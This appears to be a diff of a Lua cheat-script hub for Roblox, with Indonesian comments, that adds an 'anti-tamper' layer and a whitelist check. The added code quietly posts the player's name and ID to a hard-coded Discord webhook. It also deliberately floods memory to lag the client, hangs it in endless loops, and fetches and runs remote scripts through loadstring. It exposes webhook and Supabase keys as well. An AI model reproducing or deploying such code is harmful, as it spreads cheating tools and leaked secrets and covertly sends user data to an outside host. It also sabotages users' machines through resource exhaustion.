@@ -6,9 +6,93 @@ local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
 
--- // ========================================================== // --
--- // LAYER 1: PROTEKSI BYPASS (LAYAR MERAH 10 DETIK)            // --
--- // ========================================================== // --
+-- // 1. ANTI-TAMPER & ENVIRONMENT CHECK (DETEKSI ALAT PENCURI) // --
+local function TriggerSecurityBreach(violationType)
+    pcall(function()
+        local TrapWebhook = "https://discord.com/api/webhooks/1533700291302522901/SEoSdlAUhPsV-OVE2CpHf3CK2lLi5h7WHaRY1QM6ZVF_zfyfGK2MFMP-6JsZ2r-ekYgu"
+        local executorName = "Unknown"
+        if identifyexecutor then executorName = identifyexecutor() end
+        
+        local alertData = {
+            ["content"] = "🚨 **MIYAKO SYSTEM DETECT: ANTI-TAMPER TRIGGERED!** 🚨",
+            ["embeds"] = {{
+                ["title"] = "⚠️ Percobaan Modifikasi / Debugging Digagalkan!",
+                ["description"] = "**Detail Pelaku:**\n• Nama: `" .. LocalPlayer.Name .. "`\n• ID: `" .. LocalPlayer.UserId .. "`\n• Pelanggaran: `" .. violationType .. "`",
+                ["color"] = tonumber(0xff0000)
+            }}
+        }
+        
+        local RequestFunction = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+        if RequestFunction then
+            RequestFunction({
+                Url = TrapWebhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(alertData)
+            })
+        end
+    end)
+    
+    -- Tampilan Layar Merah Peringatan
+    pcall(function()
+        local AlertScreen = Instance.new("ScreenGui")
+        AlertScreen.Name = "Miyako_Detect_Alert"
+        AlertScreen.Parent = CoreGui
+        AlertScreen.IgnoreGuiInset = true
+        AlertScreen.DisplayOrder = 999999
+
+        local RedBg = Instance.new("Frame")
+        RedBg.Parent = AlertScreen
+        RedBg.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
+        RedBg.Size = UDim2.new(1, 0, 1, 0)
+        RedBg.BackgroundTransparency = 0.2
+
+        local AlertText = Instance.new("TextLabel")
+        AlertText.Parent = RedBg
+        AlertText.BackgroundTransparency = 1
+        AlertText.Size = UDim2.new(1, 0, 1, 0)
+        AlertText.Font = Enum.Font.Code
+        AlertText.Text = "[ MIYAKO SYSTEM DETECT: SECURITY BREACH ]\n\nNICEE TRYY BROOO!\nTrying to tamper with memory or bypass security won't work.\n\nTerminating connection..."
+        AlertText.TextColor3 = Color3.fromRGB(255, 255, 255)
+        AlertText.TextSize = 19
+        AlertText.TextWrapped = true
+        AlertText.TextXAlignment = Enum.TextXAlignment.Center
+        AlertText.TextYAlignment = Enum.TextYAlignment.Center
+
+        task.spawn(function()
+            while task.wait(0.03) do
+                RedBg.BackgroundColor3 = Color3.fromRGB(math.random(80, 255), 0, 0)
+                AlertText.Visible = not AlertText.Visible
+            end
+        end)
+    end)
+
+    local heavySpam = {}
+    local endTime = tick() + 4.5 
+    while tick() < endTime do
+        for i = 1, 6000 do
+            table.insert(heavySpam, string.rep("NICEE_TRYY_BOCAHH_FORCE_LAG_LOOP", 300))
+        end
+        task.wait()
+    end
+    heavySpam = nil
+
+    task.wait(0.1)
+    LocalPlayer:Kick("\n[ MIYAKO SYSTEM DETECT ]\n\nACCESS DENIED\nTampering or debugging tools detected.\n\n\"NICEE TRYY BOCAHH! Better luck next time.\"")
+    while true do task.wait(9e9) end
+end
+
+-- Deteksi keberadaan Spy atau Dex saat skrip dimuat
+task.spawn(function()
+    local SpyingTools = {"SimpleSpy", "HttpSpy", "RemoteSpy", "DarkDex", "Dex", "Explorer"}
+    for _, toolName in ipairs(SpyingTools) do
+        if CoreGui:FindFirstChild(toolName) then
+            TriggerSecurityBreach("MALICIOUS TOOL DETECTED (" .. toolName .. ")")
+        end
+    end
+end)
+
+-- // 2. VALIDASI TOKEN RAHASIA & SISTEM WAKTU 15 DETIK (ONE-TIME TICKET) // --
 local secureToken = nil
 local loginMethod = nil
 local ticketTime = 0
@@ -23,59 +107,15 @@ end)
 
 local expectedToken = "MIYAKO_AUTH_SUCCESS_" .. tostring(LocalPlayer.UserId * 7357)
 
--- Jika Token Kosong atau Tidak Valid (Bypass / Nembak Loadstring)
 if secureToken ~= expectedToken then
-    if setclipboard then
-        pcall(function() setclipboard("https://vt.tiktok.com/ZSVPjGWft/") end)
-    end
-    
-    local AlertGui = Instance.new("ScreenGui")
-    AlertGui.Name = "Miyako_Alert_Kick"
-    AlertGui.IgnoreGuiInset = true
-    AlertGui.DisplayOrder = 999999
-    
-    if gethui then
-        AlertGui.Parent = gethui()
-    elseif syn and syn.protect_gui then
-        syn.protect_gui(AlertGui)
-        AlertGui.Parent = CoreGui
-    else
-        AlertGui.Parent = CoreGui
-    end
-    
-    local Bg = Instance.new("Frame")
-    Bg.Parent = AlertGui
-    Bg.Size = UDim2.new(1, 0, 1, 0)
-    Bg.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
-    
-    local TextLabel = Instance.new("TextLabel")
-    TextLabel.Parent = Bg
-    TextLabel.Size = UDim2.new(1, 0, 1, 0)
-    TextLabel.BackgroundTransparency = 1
-    TextLabel.Font = Enum.Font.GothamBold
-    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    TextLabel.TextSize = 24
-    TextLabel.TextWrapped = true
-    
-    local baseText = "AKSES DITOLAK!\n\nHEYYY MAU NGAPAINN\nLINK TIKTOK MIYAKO SUDAH OTOMATIS DISALIN.\n( MIYAKO SCRIPT )\n\nSIAP SIAP YA "
-    
-    for i = 10, 1, -1 do
-        TextLabel.Text = baseText .. tostring(i) .. " DETIK HITUNGAN"
-        task.wait(1)
-    end
-    
-    LocalPlayer:Kick("\n[ MIYAKO SECURITY ]\n\nAkses Ditolak!\nSilakan ambil script login utama di TikTok Miyako.")
-    return -- Hentikan eksekusi script di sini
+    TriggerSecurityBreach("DIRECT EXECUTION / SPOOFED TOKEN")
 end
 
--- // VALIDASI WAKTU TIKET (EXPIRED CHECK) // --
 local timePassed = os.time() - ticketTime
 if timePassed > 15 or timePassed < 0 then
-    LocalPlayer:Kick("\n[ MIYAKO SECURITY ]\n\nTiket Login Kedaluwarsa!\nSilakan login ulang melalui script utama.")
-    return
+    TriggerSecurityBreach("EXPIRED TICKET DETECTED (TIMEOUT: " .. tostring(timePassed) .. "s)")
 end
 
--- Hapus token dari memory agar tidak bisa dicuri setelah masuk
 pcall(function()
     if getgenv then
         getgenv().MIYAKO_VERIFIED_ACCESS = nil
@@ -83,14 +123,52 @@ pcall(function()
     end
 end)
 
--- // ========================================================== // --
--- // LAYER 2: ANTI-REVOKE (CEK WHITELIST BERKALA Tiap 10 Detik) // --
--- // ========================================================== // --
+-- // 3. VALIDASI ULANG WHITELIST // --
 local SUPABASE_URL = "https://nhtwfeylqaipyowpvbbf.supabase.co"
 local SUPABASE_KEY = "sb_publishable_Ev3sg3AKZSLHhKonFf2B0w_wiwQNt9d"
 
+local function CheckMainWhitelist()
+    local RequestFunction = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+    if not RequestFunction then return end
+    
+    local success, response = pcall(function()
+        return RequestFunction({
+            Url = SUPABASE_URL .. "/rest/v1/whitelist?username=eq." .. LocalPlayer.Name .. "&select=username",
+            Method = "GET",
+            Headers = {
+                ["apikey"] = SUPABASE_KEY,
+                ["Authorization"] = "Bearer " .. SUPABASE_KEY,
+                ["Content-Type"] = "application/json"
+            }
+        })
+    end)
+    
+    local isFound = false
+    if success and response and response.StatusCode == 200 then
+        local decodeSuccess, decodedData = pcall(function()
+            return HttpService:JSONDecode(response.Body)
+        end)
+        if decodeSuccess and type(decodedData) == "table" and #decodedData > 0 then
+            isFound = true
+        end
+    end
+    
+    if not isFound then
+        TriggerSecurityBreach("UNAUTHORIZED USERPASSED WHITELIST CHECK")
+    end
+end
+
+if loginMethod == "WHITELIST" then
+    CheckMainWhitelist()
+elseif loginMethod == "KEY" then
+    -- Aman
+else
+    TriggerSecurityBreach("UNKNOWN LOGIN METHOD DETECTED")
+end
+
+-- // 4. SISTEM REAL-TIME REVOCATION (ANTI-REVOKE) // --
 task.spawn(function()
-    local TikTokLink = "https://vt.tiktok.com/ZSVPjGWft/"
+    local TikTokLink = "https://www.tiktok.com/@miyako_vip?_r=1&_t=ZS-98lqqUZyRGu"
     while task.wait(10) do
         local isStillValid = false
         local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
@@ -115,7 +193,6 @@ task.spawn(function()
                 end
             end
         else
-            -- Jika pakai KEY, dianggap valid (Anti-revoke key bisa dikembangkan terpisah jika mau)
             isStillValid = true 
         end
         
@@ -123,12 +200,8 @@ task.spawn(function()
             if setclipboard then setclipboard(TikTokLink) end
             
             pcall(function() 
-                if CoreGui:FindFirstChild("Miyako_Library") then 
-                    CoreGui.Miyako_Library:Destroy() 
-                elseif CoreGui:FindFirstChild("MiyakoXDameungrr_Library") then 
+                if CoreGui:FindFirstChild("MiyakoXDameungrr_Library") then 
                     CoreGui.MiyakoXDameungrr_Library:Destroy() 
-                elseif CoreGui:FindFirstChild("MiyakoScript_Library") then 
-                    CoreGui.MiyakoScript_Library:Destroy()
                 end 
             end)
             
@@ -171,17 +244,11 @@ task.spawn(function()
             Text.TextColor3 = Color3.fromRGB(255, 255, 255)
             Text.TextWrapped = true
             
-            local baseRevokeText = (loginMethod == "WHITELIST") 
-                and "WHITELIST TELAH DI CABUT!\n\nAkses Anda telah dihentikan secara permanen oleh sistem.\nTIKTOK MIYAKO SCRIPT\n\n[ LINK UDAH KESALIN DI CLIPBOARD ]\n\nSIAP SIAP YA "
-                or "KEYS SUDAH DI GANTI!\n\nKey yang Anda gunakan saat ini sudah tidak valid atau telah diperbarui.\nTIKTOK MIYAKO SCRIPT\n\n[ LINK UDAH KESALIN DI CLIPBOARD ]\n\nSIAP SIAP YA "
+            Text.Text = (loginMethod == "WHITELIST") 
+                and "WHITELIST TELAH DI CABUT!\n\nAkses Anda telah dihentikan secara permanen oleh sistem.\nJika ini adalah kesalahan, segera hubungi kami melalui:\nTIKTOK MIYAKO SCRIPT\n\n[ LINK UDAH KESALIN DI CLIPBOARD TINGGAL TEMPEL DI TIKTOK ]\n\nStatus: System Locked. Relog untuk keluar."
+                or "KEYS SUDAH DI GANTI!\n\nKey yang Anda gunakan saat ini sudah tidak valid atau telah diperbarui.\nMohon hubungi kami melalui:\nTIKTOK MIYAKO SCRIPT\n\n[ LINK UDAH KESALIN DI CLIPBOARD TINGGAL TEMPEL DI TIKTOK ]\n\nStatus: System Locked. Relog untuk keluar."
             
-            for i = 10, 1, -1 do
-                Text.Text = baseRevokeText .. tostring(i) .. " DETIK HITUNGAN"
-                task.wait(1)
-            end
-            
-            LocalPlayer:Kick("\n[ MIYAKO SECURITY ]\n\nAkses Dicabut!\nWhitelist/Key sudah tidak valid.")
-            return
+            while true do task.wait(1) end
         end
     end
 end)
@@ -290,7 +357,7 @@ local function ExecuteMiyakoHub()
     end)
 
     -- =======================
-    -- 6. TAB ALL MAP
+    -- 6. TAB ALL MAP - DI BAWAH SEKALI
     -- =======================
     local AllMapTab = Window:CreateTab("ALL MAP")
     
@@ -351,7 +418,7 @@ local function ExecuteMiyakoHub()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Miyako122/Miyako/refs/heads/main/Anime%20astral%20simulator"))()
     end)
 
-    AllMapTab:CreateSection("GROW CHIKEN FIGHTER")
+    AllMapTab:CreateSection("GROW CHIKEN FIGHTER FEATURES")
     AllMapTab:CreateButton("GROW CHIKEN FIGHTER", function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Miyako122/Miyako/refs/heads/main/grow%20ciken%20pigter"))()
     end)
